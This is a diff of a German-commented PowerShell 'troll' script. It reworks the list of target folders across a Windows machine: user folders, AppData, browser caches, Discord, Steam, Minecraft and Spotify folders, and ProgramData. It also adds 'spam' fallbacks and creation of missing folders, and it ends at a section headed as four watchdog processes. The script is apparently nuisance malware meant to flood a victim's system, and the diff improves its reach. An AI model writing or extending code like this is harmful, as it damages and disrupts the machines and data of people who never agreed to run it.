@@ -54,70 +54,109 @@ $global:trollActive = $true
 $global:currentRound = 0
 $global:maxRounds = 150
 
-# ALLE ZIELE FÜR DATEIEN/ORDNER
+# ===== ALLE ZIELE FÜR DATEIEN/ORDNER - GEFIXT! =====
 $desktop = [Environment]::GetFolderPath("Desktop")
 $documents = [Environment]::GetFolderPath("MyDocuments")
 $downloads = [Environment]::GetFolderPath("UserProfiles") + "\Downloads"
 $music = [Environment]::GetFolderPath("MyMusic")
 $pictures = [Environment]::GetFolderPath("MyPictures")
 $videos = [Environment]::GetFolderPath("MyVideos")
-$favorites = [Environment]::GetFolderPath("Favorites")
-$contacts = [Environment]::GetFolderPath("Contacts")
-$links = [Environment]::GetFolderPath("Links")
-$savedGames = [Environment]::GetFolderPath("SavedGames")
-$searches = [Environment]::GetFolderPath("Searches")
 $appData = $env:APPDATA
 $localAppData = $env:LOCALAPPDATA
 $temp = $env:TEMP
-$userProfile = $env:USERPROFILE
-$public = [Environment]::GetFolderPath("CommonDesktopDirectory")
-$commonDocs = [Environment]::GetFolderPath("CommonDocuments")
 
-# ALLE ORDNER (50+ Ziele!)
-$alleZiele = @(
-    # Benutzerordner
-    $desktop, $documents, $downloads, $music, $pictures, $videos,
-    $favorites, $contacts, $links, $savedGames, $searches,
-    
-    # AppData Pfade
-    $appData, $localAppData, $temp,
+# ALLE ORDNER - JEDER PFAD WIRD GEPRÜFT!
+$alleZiele = @()
+
+# Benutzerordner - ALLE VORHANDEN!
+$userDirs = @(
+    $desktop, $documents, $downloads, $music, $pictures, $videos
+)
+
+foreach ($dir in $userDirs) {
+    if (Test-Path $dir) {
+        $alleZiele += $dir
+        Write-Host "[OK] Benutzerordner: $dir" -ForegroundColor Green
+    }
+}
+
+# AppData Pfade
+$appDataPaths = @(
+    $appData,
+    $localAppData,
+    $temp,
     "$appData\Microsoft\Windows\Recent",
-    "$appData\Microsoft\Windows\Network Shortcuts",
     "$appData\Microsoft\Windows\Templates",
     "$localAppData\Microsoft\Windows\Caches",
     "$localAppData\Microsoft\Windows\History",
-    "$localAppData\Microsoft\Windows\INetCache",
-    
-    # Browser
+    "$localAppData\Microsoft\Windows\INetCache"
+)
+
+foreach ($path in $appDataPaths) {
+    if (Test-Path $path) {
+        $alleZiele += $path
+        Write-Host "[OK] AppData: $path" -ForegroundColor Green
+    }
+}
+
+# Browser Cache
+$browserPaths = @(
     "$localAppData\Google\Chrome\User Data\Default\Cache",
     "$localAppData\Google\Chrome\User Data\Default\Code Cache",
-    "$appData\Mozilla\Firefox\Profiles",
-    
-    # Gaming
+    "$appData\Mozilla\Firefox\Profiles"
+)
+
+foreach ($path in $browserPaths) {
+    if (Test-Path $path) {
+        $alleZiele += $path
+        Write-Host "[OK] Browser: $path" -ForegroundColor Green
+    } else {
+        # Fallback: Einfach in AppData spammen
+        $alleZiele += $appData
+    }
+}
+
+# Gaming
+$gamingPaths = @(
     "$appData\.minecraft",
-    "$appData\.minecraft\mods",
-    "$appData\.minecraft\config",
-    "$appData\.minecraft\saves",
     "$appData\Roaming\Discord",
-    "$appData\Roaming\Discord\Cache",
-    "$appData\Roaming\Spotify",
-    "$appData\Roaming\Spotify\Cache",
     "$appData\Roaming\Steam",
-    "$appData\Roaming\Steam\cache",
-    
-    # Windows
+    "$appData\Roaming\Spotify"
+)
+
+foreach ($path in $gamingPaths) {
+    if (Test-Path $path) {
+        $alleZiele += $path
+        Write-Host "[OK] Gaming: $path" -ForegroundColor Green
+    } else {
+        # Ordner erstellen wenn nicht vorhanden!
+        try {
+            New-Item -Path $path -ItemType Directory -Force | Out-Null
+            $alleZiele += $path
+            Write-Host "[NEU] Gaming Ordner erstellt: $path" -ForegroundColor Yellow
+        } catch {}
+    }
+}
+
+# Windows Pfade
+$windowsPaths = @(
     "$env:SystemRoot\Temp",
-    "$env:SystemRoot\System32\Tasks",
     "C:\ProgramData",
-    "C:\ProgramData\Microsoft\Windows\Caches",
-    "C:\ProgramData\Microsoft\Windows\WER",
-    "C:\Program Files",
-    "C:\Program Files (x86)",
-    "C:\Users\Public",
     "C:\Users\Public\Desktop",
     "C:\Users\Public\Documents",
     "C:\Users\Public\Downloads"
 )
+
+foreach ($path in $windowsPaths) {
+    if (Test-Path $path) {
+        $alleZiele += $path
+        Write-Host "[OK] Windows: $path" -ForegroundColor Green
+    }
+}
+
+Write-Host ""
+Write-Host "[INFO] GEFUNDENE ZIELE: $($alleZiele.Count)" -ForegroundColor Cyan
+Write-Host ""
 
 # ===== WATCHDOGS (4x) =====
 $watchdog1 = @"
